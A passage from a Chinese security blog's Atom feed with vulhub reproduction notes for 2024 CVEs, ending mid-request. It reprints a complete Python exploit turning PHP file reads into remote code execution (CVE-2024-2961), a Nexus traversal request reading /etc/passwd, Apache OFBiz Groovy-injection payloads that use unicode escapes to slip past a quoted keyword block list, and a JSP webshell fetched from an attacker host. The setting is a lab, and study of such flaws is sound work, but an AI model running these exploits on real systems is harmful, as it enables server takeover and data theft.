<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Salve</title>
  
  
  <link href="https://taninluv.github.io/atom.xml" rel="self"/>
  
  <link href="https://taninluv.github.io/"/>
  <updated>2024-11-20T15:25:20.834Z</updated>
  <id>https://taninluv.github.io/</id>
  
  <author>
    <name>TiAmo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vulhub_cve2024s</title>
    <link href="https://taninluv.github.io/2024/11/18/vulhub-cve2024s/"/>
    <id>https://taninluv.github.io/2024/11/18/vulhub-cve2024s/</id>
    <published>2024-11-18T15:15:27.000Z</published>
    <updated>2024-11-20T15:25:20.834Z</updated>
    
    <content type="html"><![CDATA[<p>紧急备考</p><h1 id="PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）"><a href="#PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）" class="headerlink" title="PHP利用GNU C Iconv将文件读取变成RCE（CVE-2024-2961）"></a>PHP利用GNU C Iconv将文件读取变成RCE（CVE-2024-2961）</h1><p>GNU C 是一个标准的ISO C依赖库。在GNU C中，<code>iconv()</code>函数2.39及以前存在一处缓冲区溢出漏洞，这可能会导致应用程序崩溃或覆盖相邻变量。</p><p>如果一个PHP应用中存在任意文件读取漏洞，攻击者可以利用<code>iconv()</code>的这个CVE-2024-2961漏洞，将其提升为代码执行漏洞。</p><p>按照要求配置好环境，下载exp：</p><details>    #!/usr/bin/env python3## CNEXT: PHP file-read to RCE (CVE-2024-2961)# Date: 2024-05-27# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)## TODO Parse LIBC to know if patched## INFORMATIONS## To use, implement the Remote class, which tells the exploit how to send the payload.#from __future__ import annotationsimport base64import zlibfrom dataclasses import dataclassfrom requests.exceptions import ConnectionError, ChunkedEncodingErrorfrom pwn import *from ten import *HEAP_SIZE = 2 * 1024 * 1024BUG = "劄".encode("utf-8")class Remote:    """A helper class to send the payload and download files.    The logic of the exploit is always the same, but the exploit needs to know how to    download files (/proc/self/maps and libc) and how to send the payload.    The code here serves as an example that attacks a page that looks like:    ```php    <?php    $data = file_get_contents($_POST['file']);    echo "File contents: $data";    ```    Tweak it to fit your target, and start the exploit.    """    def __init__(self, url: str) -> None:        self.url = url        self.session = Session()    def send(self, path: str) -> Response:        """Sends given `path` to the HTTP server. Returns the response.        """        return self.session.post(self.url, data={"file": path})    def download(self, path: str) -> bytes:        """Returns the contents of a remote file.        """        path = f"php://filter/convert.base64-encode/resource={path}"        response = self.send(path)        data = response.re.search(b"File contents: (.*)", flags=re.S).group(1)        return base64.decode(data)@entry@arg("url", "Target URL")@arg("command", "Command to run on the system; limited to 0x140 bytes")@arg("sleep", "Time to sleep to assert that the exploit worked. By default, 1.")@arg("heap", "Address of the main zend_mm_heap structure.")@arg(    "pad",    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "    "operations with this size, increase this. Defaults to 20.",)@dataclassclass Exploit:    """CNEXT exploit: RCE using a file read primitive in PHP."""    url: str    command: str    sleep: int = 1    heap: str = None    pad: int = 20    def __post_init__(self):        self.remote = Remote(self.url)        self.log = logger("EXPLOIT")        self.info = {}        self.heap = self.heap and int(self.heap, 16)    def check_vulnerable(self) -> None:        """Checks whether the target is reachable and properly allows for the various        wrappers and filters that the exploit needs.        """        def safe_download(path: str) -> bytes:            try:                return self.remote.download(path)            except ConnectionError:                failure("Target not [b]reachable[/] ?")             def check_token(text: str, path: str) -> bool:            result = safe_download(path)            return text.encode() == result        text = tf.random.string(50).encode()        base64 = b64(text, misalign=True).decode()        path = f"data:text/plain;base64,{base64}"        result = safe_download(path)        if text not in result:            msg_failure("Remote.download did not return the test string")            print("--------------------")            print(f"Expected test string: {text}")            print(f"Got: {result}")            print("--------------------")            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")        msg_info("The [i]data://[/] wrapper works")        text = tf.random.string(50)        base64 = b64(text.encode(), misalign=True).decode()        path = f"php://filter//resource=data:text/plain;base64,{base64}"        if not check_token(text, path):            failure("The [i]php://filter/[/] wrapper does not work")        msg_info("The [i]php://filter/[/] wrapper works")        text = tf.random.string(50)        base64 = b64(compress(text.encode()), misalign=True).decode()        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"        if not check_token(text, path):            failure("The [i]zlib[/] extension is not enabled")        msg_info("The [i]zlib[/] extension is enabled")        msg_success("Exploit preconditions are satisfied")    def get_file(self, path: str) -> bytes:        with msg_status(f"Downloading [i]{path}[/]..."):            return self.remote.download(path)    def get_regions(self) -> list[Region]:        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""        maps = self.get_file("/proc/self/maps")        maps = maps.decode()        PATTERN = re.compile(            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"        )        regions = []        for region in table.split(maps, strip=True):            if match := PATTERN.match(region):                start = int(match.group(1), 16)                stop = int(match.group(2), 16)                permissions = match.group(3)                path = match.group(4)                if "/" in path or "[" in path:                    path = path.rsplit(" ", 1)[-1]                else:                    path = ""                current = Region(start, stop, permissions, path)                regions.append(current)            else:                print(maps)                failure("Unable to parse memory mappings")        self.log.info(f"Got {len(regions)} memory regions")        return regions    def get_symbols_and_addresses(self) -> None:        """Obtains useful symbols and addresses from the file read primitive."""        regions = self.get_regions()        LIBC_FILE = "/dev/shm/cnext-libc"        # PHP's heap        self.info["heap"] = self.heap or self.find_main_heap(regions)        # Libc        libc = self._get_region(regions, "libc-", "libc.so")        self.download_file(libc.path, LIBC_FILE)        self.info["libc"] = ELF(LIBC_FILE, checksec=False)        self.info["libc"].address = libc.start    def _get_region(self, regions: list[Region], *names: str) -> Region:        """Returns the first region whose name matches one of the given names."""        for region in regions:            if any(name in region.path for name in names):                break        else:            failure("Unable to locate region")        return region    def download_file(self, remote_path: str, local_path: str) -> None:        """Downloads `remote_path` to `local_path`"""        data = self.get_file(remote_path)        Path(local_path).write(data)    def find_main_heap(self, regions: list[Region]) -> Region:        # Any anonymous RW region with a size superior to the base heap size is a        # candidate. The heap is at the bottom of the region.        heaps = [            region.stop - HEAP_SIZE + 0x40            for region in reversed(regions)            if region.permissions == "rw-p"            and region.size >= HEAP_SIZE            and region.stop & (HEAP_SIZE-1) == 0            and region.path in ("", "[anon:zend_alloc]")        ]        if not heaps:            failure("Unable to find PHP's main heap in memory")        first = heaps[0]        if len(heaps) > 1:            heaps = ", ".join(map(hex, heaps))            msg_info(f"Potential heaps: [i]{heaps}[/] (using first)")        else:            msg_info(f"Using [i]{hex(first)}[/] as heap")        return first    def run(self) -> None:        self.check_vulnerable()        self.get_symbols_and_addresses()        self.exploit()    def build_exploit_path(self) -> str:        """On each step of the exploit, a filter will process each chunk one after the        other. Processing generally involves making some kind of operation either        on the chunk or in a destination chunk of the same size. Each operation is        applied on every single chunk; you cannot make PHP apply iconv on the first 10        chunks and leave the rest in place. That's where the difficulties come from.        Keep in mind that we know the address of the main heap, and the libraries.        ASLR/PIE do not matter here.        The idea is to use the bug to make the freelist for chunks of size 0x100 point        lower. For instance, we have the following free list:        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00        By triggering the bug from chunk ..900, we get:        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???        That's step 3.        Now, in order to control the free list, and make it point whereever we want,        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.        That's step 2.        Now, if we were to perform step2 an then step3 without anything else, we'd have        a problem: after step2 has been processed, the free list goes bottom-up, like:        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900        We need to go the other way around. That's why we have step 1: it just allocates        chunks. When they get freed, they reverse the free list. Now step2 allocates in        reverse order, and therefore after step2, chunks are in the correct order.        Another problem comes up.        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.        Since step2 creates chunks that contain pointers and pointers are generally not        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.        To avoid this, we put the chunks in step2 at the very end of the chain, and        prefix them with `0\n`. When dechunked (right before the iconv), they will        "disappear" from the chain, preserving them from the character set conversion        and saving us from an unwanted processing error that would stop the processing        chain.        After step3 we have a corrupted freelist with an arbitrary pointer into it. We        don't know the precise layout of the heap, but we know that at the top of the        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.        Its free_slot[] array contains a pointer to each free list. By overwriting it,        we can make PHP allocate chunks whereever we want. In addition, its custom_heap        field contains pointers to hook functions for emalloc, efree, and erealloc        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and        then overwrite the use_custom_heap flag to make PHP use these function pointers        instead. We can now do our favorite CTF technique and get a call to        system(<chunk>).        We make sure that the "system" command kills the current process to avoid other        system() calls with random chunk data, leading to undefined behaviour.        The pad blocks just "pad" our allocations so that even if the heap of the        process is in a random state, we still get contiguous, in order chunks for our        exploit.        Therefore, the whole process described here CANNOT crash. Everything falls        perfectly in place, and nothing can get in the middle of our allocations.        """        LIBC = self.info["libc"]        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]        ADDR_EFREE = LIBC.symbols["__libc_system"]        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]        ADDR_HEAP = self.info["heap"]        ADDR_FREE_SLOT = ADDR_HEAP + 0x20        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10        CS = 0x100        # Pad needs to stay at size 0x100 at every step        pad_size = CS - 0x18        pad = b"\x00" * pad_size        pad = chunked_chunk(pad, len(pad) + 6)        pad = chunked_chunk(pad, len(pad) + 6)        pad = chunked_chunk(pad, len(pad) + 6)        pad = compressed_bucket(pad)        step1_size = 1        step1 = b"\x00" * step1_size        step1 = chunked_chunk(step1)        step1 = chunked_chunk(step1)        step1 = chunked_chunk(step1, CS)        step1 = compressed_bucket(step1)        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to        # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"        step2_size = 0x48        step2 = b"\x00" * (step2_size + 8)        step2 = chunked_chunk(step2, CS)        step2 = chunked_chunk(step2)        step2 = compressed_bucket(step2)        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)        step2_write_ptr = chunked_chunk(step2_write_ptr)        step2_write_ptr = compressed_bucket(step2_write_ptr)        step3_size = CS        step3 = b"\x00" * step3_size        assert len(step3) == CS        step3 = chunked_chunk(step3)        step3 = chunked_chunk(step3)        step3 = chunked_chunk(step3)        step3 = compressed_bucket(step3)        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG        assert len(step3_overflow) == CS        step3_overflow = chunked_chunk(step3_overflow)        step3_overflow = chunked_chunk(step3_overflow)        step3_overflow = chunked_chunk(step3_overflow)        step3_overflow = compressed_bucket(step3_overflow)        step4_size = CS        step4 = b"=00" + b"\x00" * (step4_size - 1)        step4 = chunked_chunk(step4)        step4 = chunked_chunk(step4)        step4 = chunked_chunk(step4)        step4 = compressed_bucket(step4)        # This chunk will eventually overwrite mm_heap->free_slot        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values        step4_pwn = ptr_bucket(            0x200000,            0,            # free_slot            0,            0,            ADDR_CUSTOM_HEAP,  # 0x18            0,            0,            0,            0,            0,            0,            0,            0,            0,            0,            0,            0,            0,            ADDR_HEAP,  # 0x140            0,            0,            0,            0,            0,            0,            0,            0,            0,            0,            0,            0,            0,            size=CS,        )        step4_custom_heap = ptr_bucket(            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18        )        step4_use_custom_heap_size = 0x140        COMMAND = self.command        COMMAND = f"kill -9 $PPID; {COMMAND}"        if self.sleep:            COMMAND = f"sleep {self.sleep}; {COMMAND}"        COMMAND = COMMAND.encode() + b"\x00"        assert (            len(COMMAND) <= step4_use_custom_heap_size        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")        step4_use_custom_heap = COMMAND        step4_use_custom_heap = qpe(step4_use_custom_heap)        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)        pages = (            step4 * 3            + step4_pwn            + step4_custom_heap            + step4_use_custom_heap            + step3_overflow            + pad * self.pad            + step1 * 3            + step2_write_ptr            + step2 * 2        )        resource = compress(compress(pages))        resource = b64(resource)        resource = f"data:text/plain;base64,{resource.decode()}"        filters = [            # Create buckets            "zlib.inflate",            "zlib.inflate",            # Step 0: Setup heap            "dechunk",            "convert.iconv.L1.L1",            # Step 1: Reverse FL order            "dechunk",            "convert.iconv.L1.L1",            # Step 2: Put fake pointer and make FL order back to normal            "dechunk",            "convert.iconv.L1.L1",            # Step 3: Trigger overflow            "dechunk",            "convert.iconv.UTF-8.ISO-2022-CN-EXT",            # Step 4: Allocate at arbitrary address and change zend_mm_heap            "convert.quoted-printable-decode",            "convert.iconv.L1.L1",        ]        filters = "|".join(filters)        path = f"php://filter/read={filters}/resource={resource}"        return path    @inform("Triggering...")    def exploit(self) -> None:        path = self.build_exploit_path()        start = time.time()        try:            self.remote.send(path)        except (ConnectionError, ChunkedEncodingError):            pass        msg_print()        if not self.sleep:            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")        elif start + self.sleep <= time.time():            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")        else:            # Wrong heap, maybe? If the exploited suggested others, use them!            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")        msg_print()def compress(data) -> bytes:    """Returns data suitable for `zlib.inflate`.    """    # Remove 2-byte header and 4-byte checksum    return zlib.compress(data, 9)[2:-4]def b64(data: bytes, misalign=True) -> bytes:    payload = base64.encode(data)    if not misalign and payload.endswith("="):        raise ValueError(f"Misaligned: {data}")    return payload.encode()def compressed_bucket(data: bytes) -> bytes:    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""    return chunked_chunk(data, 0x8000)def qpe(data: bytes) -> bytes:    """Emulates quoted-printable-encode.    """    return "".join(f"={x:02x}" for x in data).upper().encode()def ptr_bucket(*ptrs, size=None) -> bytes:    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""    if size is not None:        assert len(ptrs) * 8 == size    bucket = b"".join(map(p64, ptrs))    bucket = qpe(bucket)    bucket = chunked_chunk(bucket)    bucket = chunked_chunk(bucket)    bucket = chunked_chunk(bucket)    bucket = compressed_bucket(bucket)    return bucketdef chunked_chunk(data: bytes, size: int = None) -> bytes:    """Constructs a chunked representation of the given chunk. If size is given, the    chunked representation has size `size`.    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.    """    # The caller does not care about the size: let's just add 8, which is more than    # enough    if size is None:        size = len(data) + 8    keep = len(data) + len(b"\n\n")    size = f"{len(data):x}".rjust(size - keep, "0")    return size.encode() + b"\n" + data + b"\n"@dataclassclass Region:    """A memory region."""    start: int    stop: int    permissions: str    path: str    @property    def size(self) -> int:        return self.stop - self.startExploit()</details><pre><code>└─# python exp.py http://127.0.0.1:8080/index.php &quot;echo &#39;&lt;?=phpinfo();?&gt;&#39; &gt; shell.php&quot;[*] The data:// wrapper works[*] The php://filter/ wrapper works[*] The zlib extension is enabled[+] Exploit preconditions are satisfied[*] Using 0x7fcdcb800040 as heap     EXPLOIT  SUCCESS </code></pre><p>访问<code>shell.php</code>复现成功</p><h1 id="Nexus-Repository-Manager-3-未授权目录穿越漏洞（CVE-2024-4956）"><a href="#Nexus-Repository-Manager-3-未授权目录穿越漏洞（CVE-2024-4956）" class="headerlink" title="Nexus Repository Manager 3 未授权目录穿越漏洞（CVE-2024-4956）"></a>Nexus Repository Manager 3 未授权目录穿越漏洞（CVE-2024-4956）</h1><p>Nexus Repository Manager 3 是一款软件仓库，可以用来存储和分发Maven、NuGET等软件源仓库。</p><p>其3.68.0及之前版本中，存在一处目录穿越漏洞。攻击者可以利用该漏洞读取服务器上任意文件。</p><p>与Orange Tsai在<a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf">Blackhat US 2018</a>分享的SpringMVC CVE-2018-1271漏洞类似，Jetty的<code>URIUtil.canonicalPath()</code>函数也将空字符串认为是一个合法目录，导致了该漏洞的产生：</p><p><img src="/img/2.png" alt="img"></p><p>这玩意儿运行在8081端口,界面：</p><p><img src="/img/2dbae64b4b81458e8d19058af7e49e85.png" alt="img"></p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><pre><code>GET /%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1Host: localhost:8081Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36Connection: closeCache-Control: max-age=0</code></pre><p><code>/etc/passwd</code>被成功读取</p><h1 id="Apache-OFBiz-身份验证绕过导致远程代码执行-CVE-2024-38856"><a href="#Apache-OFBiz-身份验证绕过导致远程代码执行-CVE-2024-38856" class="headerlink" title="Apache OFBiz 身份验证绕过导致远程代码执行 (CVE-2024-38856)"></a>Apache OFBiz 身份验证绕过导致远程代码执行 (CVE-2024-38856)</h1><p>Apache OFBiz 是一个开源的企业资源规划（ERP）系统。它提供了一套企业应用程序，用于集成和自动化企业的许多业务流程。</p><p>这个漏洞是由于对 CVE-2023-51467 的不完全修复而产生的。在 Apache OFBiz 18.12.11 版本中，开发人员认为他们已经修复了该漏洞，但实际上他们只解决了其中一种利用方法。Groovy 表达式注入仍然存在，允许未经授权的用户在服务器上执行任意命令。</p><p>访问<code>https://localhost:8443/accounting</code>查看到登录页面，说明环境已启动成功。</p><p><img src="/img/image-20241119001325262.png" alt="image-20241119001325262"></p><p>poc</p><pre><code>POST /webtools/control/main/ProgramExport HTTP/1.1Host: localhost:8443Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36Connection: closeCache-Control: max-age=0Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDbR7sY3IIwQX7kcJContent-Length: 190------WebKitFormBoundaryDbR7sY3IIwQX7kcJContent-Disposition: form-data; name=&quot;groovyProgram&quot;throw new Exception(&#39;id&#39;.\u0065xecute().text);------WebKitFormBoundaryDbR7sY3IIwQX7kcJ--</code></pre><p>成功rce</p><p>值得注意的是，Apache Ofbiz限制了如下一些关键词的使用，我们可以通过Unicode编码来绕过这个限制，比如<code>\u0065xecute</code>：</p><pre><code>deniedWebShellTokens=java.,beans,freemarker,&lt;script,javascript,&lt;body,body ,&lt;form,&lt;jsp:,&lt;c:out,taglib,&lt;prefix,&lt;%@ page,&lt;?php,exec(,alert(,\                     %eval,@eval,eval(,runtime,import,passthru,shell_exec,assert,str_rot13,system,decode,include,page ,\                     chmod,mkdir,fopen,fclose,new file,upload,getfilename,download,getoutputstring,readfile,iframe,object,embed,onload,build,\                     python,perl ,/perl,ruby ,/ruby,process,function,class,InputStream,to_server,wget ,static,assign,webappPath,\                     ifconfig,route,crontab,netstat,uname ,hostname,iptables,whoami,&quot;cmd&quot;,*cmd|,+cmd|,=cmd|,localhost,thread,require,gzdeflate,\                     execute,println,calc,touch,calculate</code></pre><p>附php的Unicode加解码：</p><details>    1. 将字符转换为 Unicode 编码要将普通字符串转换为 Unicode 转义序列（如 \u0065），可以使用以下方法：php复制代码function unicode_encode($str) {    $encoded = '';    for ($i = 0; $i < mb_strlen($str, 'UTF-8'); $i++) {        $char = mb_substr($str, $i, 1, 'UTF-8');        $code = unpack('N', mb_convert_encoding($char, 'UCS-4BE', 'UTF-8'));        $encoded .= sprintf('\u%04x', $code[1]);    }    return $encoded;}echo unicode_encode("Hello"); // 输出 \u0048\u0065\u006c\u006c\u006f2. 解码 Unicode 转义序列将 Unicode 转义序列（如 \u0065）解码为普通字符串：php复制代码function unicode_decode($str) {    return preg_replace_callback('/\\\\u([0-9a-fA-F]{4})/', function ($matches) {        return mb_convert_encoding(pack('H*', $matches[1]), 'UTF-8', 'UCS-2BE');    }, $str);}echo unicode_decode("\u0048\u0065\u006c\u006c\u006f"); // 输出 Hello</details><h1 id="Apache-OFBiz-身份验证绕过导致远程代码执行（CVE-2024-45195）"><a href="#Apache-OFBiz-身份验证绕过导致远程代码执行（CVE-2024-45195）" class="headerlink" title="Apache OFBiz 身份验证绕过导致远程代码执行（CVE-2024-45195）"></a>Apache OFBiz 身份验证绕过导致远程代码执行（CVE-2024-45195）</h1><p>Apache OFBiz是一个开源企业资源规划（ERP）系统。它提供了一套企业应用程序，集成并自动化企业的许多业务流程。</p><p>该漏洞是由于之前漏洞（CVE-2024-32113、CVE-2024-36104和CVE-2024-38856）未完全修复所导致。在Apache OFBiz版本18.12.16之前，开发人员对这些先前的问题进行了修复，但控制器视图地图状态不同步的根本问题仍然存在。这使得攻击者能够绕过身份验证并访问敏感的仅限管理员的视图地图。</p><p>在复现此漏洞之前，我们需要在自己控制的服务器上部署恶意XML文件和CSV文件。</p><p>第一个文件是<code>rceschema.xml</code>，此XML schema文件定义了恶意 JSP 的结构：</p><pre><code>&lt;data-files xsi:noNamespaceSchemaLocation=&quot;http://ofbiz.apache.org/dtds/datafiles.xsd&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;    &lt;data-file name=&quot;rce&quot; separator-style=&quot;fixed-length&quot; type-code=&quot;text&quot; start-line=&quot;0&quot; encoding-type=&quot;UTF-8&quot;&gt;        &lt;record name=&quot;rceentry&quot; limit=&quot;many&quot;&gt;            &lt;field name=&quot;jsp&quot; type=&quot;String&quot; length=&quot;605&quot; position=&quot;0&quot;&gt;&lt;/field&gt;        &lt;/record&gt;    &lt;/data-file&gt;&lt;/data-files&gt;</code></pre><p>第二个文件是<code>rcereport.csv</code>，此CSV文件包含实际的JSP代码：</p><pre><code>&lt;%@ page import=&#39;java.io.*&#39; %&gt;&lt;%@ page import=&#39;java.util.*&#39; %&gt;&lt;h1&gt;Ahoy!&lt;/h1&gt;&lt;br&gt;&lt;% String getcmd = request.getParameter(&quot;cmd&quot;); if (getcmd != null) &#123; out.println(&quot;Command: &quot; + getcmd + &quot;&lt;br&gt;&quot;); String cmd1 = &quot;/bin/sh&quot;; String cmd2 = &quot;-c&quot;; String cmd3 = getcmd; String[] cmd = new String[3]; cmd[0] = cmd1; cmd[1] = cmd2; cmd[2] = cmd3; Process p = Runtime.getRuntime().exec(cmd); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) &#123; out.println(disr); disr = dis.readLine();&#125;&#125; %&gt;,</code></pre><p>然后发送以下请求：</p><pre><code>POST /webtools/control/forgotPassword/viewdatafile HTTP/1.1Host: target:8443User-Agent: curl/7.81.0Accept: */*Content-Length: 241Content-Type: application/x-www-form-urlencodedDATAFILE_LOCATION=http://attacker/rcereport.csv&amp;DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&amp;DATAFILE_IS_URL=true&amp;DEFINITION_LOCATION=http://attacker/rceschema.xml&amp;DEFINITION_IS_URL=true&amp;DEFINITION_NAME=rce</code></pre><p>该请求通过利用viewdatafile视图地图将恶意JSP文件写入Web根目录，从而利用了该漏洞实现远程代码执行。</p><p>在JSP webshell被写入后，通过<code>https://localhost:8443/accounting/index.jsp?cmd=id</code>即可执行任意命令</p><p>用这个包成功</p><pre><code>POST /webtools/control/forgotPassword/viewdatafile HTTP/1.1Host: 127.0.0.1:8443Cookie: JSESSIONID=179230503829DC0456EC9E91A591BCB7.jvm1; adminer_permanent=; adminer_sid=f5cccc54dc09d51108d8ea214ee1a1dc; adminer_key=8092110359b49587bb7ade16a8fe0fa7; adminer_version=4.8.1; NX-ANTI-CSRF-TOKEN=0.15829410785017417; OFBiz.Visitor=10000User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Te: trailersConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 371DATAFILE_LOCATION=http://172.20.10.4:8000/rcereport.csv&amp;DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&amp;DATAFILE_IS_URL=true&amp;DEFINITION_LOCATION=http://172.20.10.4:8000/rceschema.xml&amp;DEFINITION_IS_URL=true&amp;DEFINITION_NAME=rce&amp;DATAFILE_LOCATION=http://172.20.10.4:8000/rcereport.csv&amp;DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp</code></pre><p>这里我环境中第一次<code>DATAFILE_LOCATION=http://172.20.10.4:8000/rcereport.csv&amp;DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp</code>总是会被吞掉，服务器也没有访问记录，第二个句子能执行，再在第二句之后加一遍发现都执行成功，但是第一句不知为什么不被执行</p><p>访问<code>/accounting/index.jsp?cmd=id</code>rce成功</p><h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><h3 id="CVE-2024-32113"><a href="#CVE-2024-32113" class="headerlink" title="CVE-2024-32113"></a>CVE-2024-32113</h3><p><a href="https://xz.aliyun.com/t/14733?u_atoken=69f20c2ee3b90c47098229b498693367&u_asig=1a0c384917320260008202245e00fe">ofbiz目录遍历致代码执行漏洞（CVE-2024-32113）分析 - 先知社区</a></p><p>**”..&#x2F;“<strong>和</strong>“;”**进行截断绕过filter处理</p><p>直接构造 18.12.14 及之前版本通杀的路径 payload，不需要进行目录遍历。</p><pre><code>/webtools/control/ListTimezones/ProgramExport?...。。。groovyProgram=&#39;calc.exe&#39;.execute()       </code></pre><p><strong>18.12.13版本：</strong> 主要体现在将ListTimezones的 auth 改为 true，黑名单里增加execute关键字，ControlFilter.doFilter() 中校验了规范化前后的 url 是否一致，以此来判断 url 是否含有特殊字符。</p><p><strong>18.12.14版本：</strong><br>网上使用的 payload 是将.换为%2e或;来绕过 18.12.13 版本的修复代码，于是官方在 18.12.14 版本的 ControlFilter.doFilter() 中添加过滤了%2e和;，不过仍然没有修复到问题关键。</p><p><img src="/img/20240530152728-11a2b3e2-1e56-1.png" alt="img"></p><p><img src="/img/20240530152735-15b0f6ba-1e56-1.png" alt="img"></p><h3 id="CVE-2024-36104"><a href="#CVE-2024-36104" class="headerlink" title="CVE-2024-36104"></a>CVE-2024-36104</h3><p>由于对<a href="https://so.csdn.net/so/search?q=HTTP%E8%AF%B7%E6%B1%82&spm=1001.2101.3001.7020">HTTP请求</a>URL中的特殊字符（如；、%2e）限制不当，威胁者可构造恶意请求利用该漏洞，成功利用可能导致远程代码执行。</p><p>Apache OFBiz &lt; 18.12.14</p><pre><code>POST /webtools/control/forgotPassword/%2e/%2e/ProgramExport HTTP/1.1Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Content-Type: application/x-www-form-urlencodedContent-Length: 0 groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0069\u0064\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b</code></pre><h3 id="CVE-2024-38856"><a href="#CVE-2024-38856" class="headerlink" title="CVE-2024-38856"></a>CVE-2024-38856</h3><p>apache OFBiz 在处理 view 视图渲染的时候存在逻辑缺陷，未经身份验证的攻击者可通过构造特殊 URL 来覆盖最终的渲染视图，从而执行任意代码。</p><pre><code>POST /webtools/control/main/ProgramExport HTTP/1.1Host: 127.0.0.1:8443Connection: closeUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Content-Type: application/x-www-form-urlencodedContent-Length: 